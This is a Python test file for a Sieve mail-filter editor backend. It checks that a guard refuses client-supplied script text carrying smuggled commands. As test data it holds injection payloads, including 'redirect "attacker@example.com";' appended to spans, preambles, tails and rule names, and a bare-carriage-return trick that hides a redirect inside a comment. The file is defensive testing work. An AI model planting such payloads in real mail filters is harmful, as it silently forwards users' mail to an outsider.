"""
The verbatim path cannot be used to smuggle text (areyousievious-8fg.14).

`source` crosses the wire, so a client can propose any bytes it likes and ask
us to write them to the user's mail server unaltered. The guard re-parses what
it is given: the span must yield exactly this entry and nothing else — no
extra statement, no `require`, no preamble, no tail. It fails CLOSED, so an
entry it cannot vouch for is regenerated rather than trusted.

Run from the backend/ directory:
    cd backend && python -m pytest tests/test_span_injection_guard.py -v
"""

from __future__ import annotations

from pathlib import Path

import pytest
import sieve_transform as st

from tests.fakes import FakeScriptStore

BACKEND = Path(__file__).resolve().parent.parent
FIXTURES = sorted(p for p in (BACKEND / "test_scripts").rglob("*.sieve") if p.stat().st_size > 0)


def _round_tripped(text: str) -> st.Entry:
    """The single entry `text` parses to, span and all."""
    entries = st.parse_sieve(text).entries
    assert len(entries) == 1, entries
    return entries[0]


def test_a_span_the_parser_itself_produced_is_faithful():
    entry = _round_tripped(
        '# --- Spam ---\nif header :contains "subject" "spam" {\n  fileinto "Junk";\n}\n'
    )
    assert st.span_is_faithful(entry)


def test_an_empty_span_is_not_faithful():
    """A Rule the builder minted has nothing to re-emit."""
    assert not st.span_is_faithful(st.Rule(name="New"))


def test_a_span_carrying_a_second_statement_is_refused():
    """The smuggling case: the span parses to the right rule PLUS a command
    the user never wrote. Two entries, so the guard refuses it."""
    entry = _round_tripped("if true {\n  keep;\n}\n")
    entry.source += 'redirect "attacker@example.com";\n'
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_a_require_is_refused():
    entry = _round_tripped("if true {\n  keep;\n}\n")
    entry.source = 'require ["vacation"];\n' + entry.source
    assert not st.span_is_faithful(entry)


# A rule the parser RECOGNISES. `if true { ... }` is a RawBlock — `true` is
# not a test the builder can edit — so it has no `.actions` to change, and the
# two tests below are about editing a field of a Rule.
_AN_EDITABLE_RULE = 'if header :contains "subject" "receipt" {\n  fileinto "Junk";\n}\n'


def test_a_span_whose_meaning_differs_from_the_entry_is_refused():
    """The edited-rule case, which is the common one: the client changed the
    folder, so the span no longer describes the entry and must regenerate."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.actions[0].argument = "Inbox"
    assert not st.span_is_faithful(entry)


def test_a_reverted_edit_is_faithful_again():
    """Dirty is a comparison, not a flag: changed-and-changed-back is clean."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.actions[0].argument = "Inbox"
    entry.actions[0].argument = "Junk"
    assert st.span_is_faithful(entry)


def test_a_raw_block_span_is_guarded_the_same_way():
    entry = _round_tripped('vacation :days 7 "Away";\n')
    assert isinstance(entry, st.RawBlock)
    assert st.span_is_faithful(entry)
    entry.text = "discard;"
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_loose_bytes_after_the_entry_is_refused():
    """Not in the plan's seven; added because deleting the `reparsed.tail`
    term broke none of them, and the term turns out to be load-bearing rather
    than defensive. A comment appended to an honest span re-parses to the same
    single entry — the rule compares equal, so value equality waves it through
    — and the loose bytes ride out verbatim on the back of it."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.source += "\n# smuggled trailing note\n"
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_loose_bytes_before_the_entry_is_refused():
    """The other end, and the reason `no requires` does not already cover it:
    `require [];` declares NOTHING, so `reparsed.requires` is empty and that
    check never fires. The statement and the blank lines above it land in
    `preamble` instead, and the rule below re-parses value-equal to this entry
    — so preamble is the only term that refuses it, and without it those bytes
    would be written to the mail server verbatim.

    Blank lines rather than a comment on purpose: a comment here is absorbed as
    the rule's NAME, which makes value equality refuse the span and would leave
    this test passing for a reason that has nothing to do with the preamble.
    """
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.source = "\n\nrequire [];\n" + entry.source
    assert not st.span_is_faithful(entry)


# ── The bytes no entry vouches for ──


def test_a_preamble_carrying_a_command_is_refused():
    """`span_is_faithful` guards the entries. The preamble and tail are
    re-emitted verbatim too, and have no entry to be compared against — so
    they get their own guard: they may hold comments and blank lines and the
    `require` statement, and nothing else."""
    script = st.SieveScript(
        requires=["fileinto"],
        preamble='redirect "attacker@example.com";\n',
        requires_source='require ["fileinto"];\n',
    )
    assert st.preflight_error(script) is not None


def test_a_tail_carrying_a_command_is_refused():
    script = st.SieveScript(tail='\nredirect "attacker@example.com";\n')
    assert st.preflight_error(script) is not None


def test_a_requires_source_declaring_more_than_it_says_is_refused():
    """The bytes must agree with the list. Otherwise a client could declare
    `["fileinto"]` on the wire and write `require ["fileinto", "vacation"];`."""
    script = st.SieveScript(
        requires=["fileinto"], requires_source='require ["fileinto", "vacation"];\n'
    )
    assert st.preflight_error(script) is not None


def test_a_script_that_declares_an_extension_but_carries_no_require_bytes_passes():
    """The ordinary save, and the reason the requires check is SUBSET rather
    than equality. A script built in the UI has no `requires_source` — there
    were never any bytes to parse — and the generator renders that line
    canonically from the declared list. An equality check refuses this, which
    is not a guard but a lockout: it refused nine existing tests, including
    `test_saving_rules_stores_generated_sieve`. Do not tighten it back.
    """
    script = st.SieveScript(requires=["fileinto"], requires_source="", preamble="")
    assert st.preflight_error(script) is None


def test_an_honest_preamble_and_tail_pass():
    script = st.SieveScript(
        requires=["fileinto"],
        preamble="# Generated by Roundcube\n\n",
        requires_source='require ["fileinto"];\n',
        tail="\n# end\n",
    )
    assert st.preflight_error(script) is None


def test_several_require_statements_and_the_comment_between_them_pass():
    """`requires_source` is not always one well-formed statement: a file that
    declares its extensions in three goes keeps the comment sitting between
    them in the same span. The head is parsed as ONE unit for exactly this
    reason — anything that checked a single statement would refuse it."""
    script = st.parse_sieve((BACKEND / "test_scripts" / "multiple-requires.sieve").read_text())
    assert script.requires_source.count("require") >= 2, script.requires_source
    assert st.preflight_error(script) is None


def test_a_require_that_arrived_after_an_entry_leaves_the_head_empty():
    """A `require` below the first entry is deliberately routed to a RawBlock
    and its extensions are deliberately NOT harvested — so this script declares
    nothing and has no `requires_source` at all. Both sides of the comparison
    are empty, which is agreement, and the guard must say so."""
    script = st.parse_sieve(
        'if header :contains "subject" "x" {\n  keep;\n}\n\nrequire ["vacation"];\n'
    )
    assert script.requires == []
    assert script.requires_source == ""
    assert st.preflight_error(script) is None


def test_the_endpoint_rejects_a_hostile_preamble_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = http.put(
            "/api/scripts/primary",
            json={
                "requires": [],
                "preamble": 'redirect "attacker@example.com";\n',
                "requires_source": "",
                "tail": "",
                "entries": [],
            },
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


def test_the_endpoint_rejects_a_hostile_tail_without_writing(authed_client):
    """The other end of the same hole. `tail` is emitted verbatim on BOTH
    generator paths, so a save that regenerates every entry still writes it."""
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = http.put(
            "/api/scripts/primary",
            json={
                "requires": [],
                "preamble": "",
                "requires_source": "",
                "tail": '\nredirect "attacker@example.com";\n',
                "entries": [],
            },
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


@pytest.mark.parametrize(
    "path", FIXTURES, ids=lambda p: str(p.relative_to(BACKEND / "test_scripts"))
)
def test_no_real_script_is_refused_by_the_boundary_guard(path: Path):
    """A guard that refuses a real script locks a user out of their own
    filters. Every fixture must round-trip through it cleanly.

    This is the test that stops this from being the `.13` failure again: a
    whole-script validator false-rejects forever on any extension sievelib
    lacks. `_boundary_error` runs OUR parser over the head and tail only, so it
    does not inherit that — and 63 real scripts, 42 of which parse to no Rule
    at all, are the evidence rather than the argument.
    """
    assert st.preflight_error(st.parse_sieve(path.read_text())) is None


def test_a_require_statement_split_across_the_preamble_and_the_require_bytes_is_refused():
    """Found by attacking the guard rather than by the plan.

    Joined, these two read as one honest `require ["fileinto"];`. But the
    generator emits `requires_source` ONLY when nothing regenerated — any other
    save writes the preamble against a freshly rendered require line, so what
    goes out is `require ["fileinto"require ["fileinto"];` and the server
    refuses the whole script. Checking the join alone vouched for bytes that
    are never written in that combination; the preamble is checked on its own
    for exactly this.
    """
    script = st.SieveScript(
        requires=["fileinto"],
        preamble='require ["fileinto"',
        requires_source="];\n",
    )
    assert st.preflight_error(script) is not None


# ── The carriage return that ends a line for the server but not for us ──


_CR_SMUGGLED = '# harmless note\rredirect "attacker@example.com";'


def test_a_bare_carriage_return_in_the_preamble_is_refused():
    """Found by fuzzing this guard, and the only vector that got through it.

    We split lines on "\\n", so the CR is an ordinary character and the whole
    thing is ONE comment — to our parser, to sievelib, and therefore to the
    `.13` pre-flight too. RFC 5228 ends a comment at CRLF and excludes CR from
    its body, so what a server does after that CR is undefined and one reading
    of it runs the redirect. Nothing else in the stack was going to notice.
    """
    assert st.preflight_error(st.SieveScript(preamble=_CR_SMUGGLED + "\n")) is not None


def test_a_bare_carriage_return_in_the_tail_is_refused():
    assert st.preflight_error(st.SieveScript(tail="\n" + _CR_SMUGGLED + "\n")) is not None


def test_a_bare_carriage_return_inside_a_faithful_span_is_refused():
    """The same bytes through the entry door, which `span_is_faithful` cannot
    close on its own. The comment is absorbed as the Rule's NAME, so the span
    re-parses value-equal to the entry it accompanies and the guard vouches for
    it — correctly, by its own rule. This is why the CR check is asked of the
    whole script rather than bolted onto either guard.
    """
    script = st.parse_sieve(_CR_SMUGGLED + '\nif header :contains "subject" "x" {\n  keep;\n}\n')
    assert st.span_is_faithful(script.entries[0]), "premise: the span vouches for itself"
    assert st.preflight_error(script) is not None


def test_a_bare_carriage_return_in_a_canonically_rendered_comment_is_refused():
    """The third door, which predates spans entirely: `RawBlock.comment` is
    written out as a `# ` line by the regenerating path, so a client that never
    sends a `source` at all still gets its bytes onto the mail server."""
    block = st.RawBlock(text="keep;", comment='c\rredirect "attacker@example.com";')
    assert st.preflight_error(st.SieveScript(entries=[block])) is not None


def test_a_bare_carriage_return_in_a_rule_name_is_refused():
    rule = st.Rule(
        name='n\rredirect "attacker@example.com";',
        conditions=[st.Condition(header="subject", match_type="contains", value="x")],
        actions=[st.Action(action_type="keep")],
    )
    assert st.preflight_error(st.SieveScript(entries=[rule])) is not None


def test_crlf_line_endings_are_not_refused():
    """The check is for a LONE carriage return. A script written on Windows, or
    one a server handed back with CRLF endings, has a CR before every LF and
    must still save — refusing it would be the lockout this guard exists to
    avoid, over a file we never had a complaint about.
    """
    script = st.SieveScript(
        requires=["fileinto"],
        preamble="# Generated by Roundcube\r\n\r\n",
        requires_source='require ["fileinto"];\r\n',
        tail="\r\n# end\r\n",
    )
    assert st.preflight_error(script) is None


def test_the_endpoint_rejects_a_smuggled_carriage_return_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = http.put(
            "/api/scripts/primary",
            json={
                "requires": [],
                "preamble": _CR_SMUGGLED + "\n",
                "requires_source": "",
                "tail": "",
                "entries": [],
            },
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"
